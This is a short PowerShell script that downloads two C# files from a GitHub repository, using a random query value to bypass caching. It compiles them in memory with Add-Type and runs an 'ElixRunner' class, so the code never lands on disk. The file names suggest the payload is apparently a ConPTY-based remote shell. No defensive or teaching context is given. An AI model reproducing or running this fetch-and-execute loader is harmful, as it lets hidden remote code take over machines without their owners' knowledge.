
$uri1 = "https://raw.githubusercontent.com/Metivzora/RS/main/ConPtyApi.cs?v=" + (Get-Random)
$uri2 = "https://raw.githubusercontent.com/Metivzora/RS/main/Runner.cs?v=" + (Get-Random)

$web = New-Object System.Net.WebClient
try {

    [string]$c1 = $web.DownloadString($uri1)
    [string]$c2 = $web.DownloadString($uri2)

    if ($c1 -and $c2) {

        $fullCode = [string]::Concat($c1, [System.Environment]::NewLine, $c2)
        

        Add-Type -TypeDefinition $fullCode


        [ElixRunner]::Start()
    }
} catch {
    Write-Error "Ошибка инициализации: $($_.Exception.Message)"
}
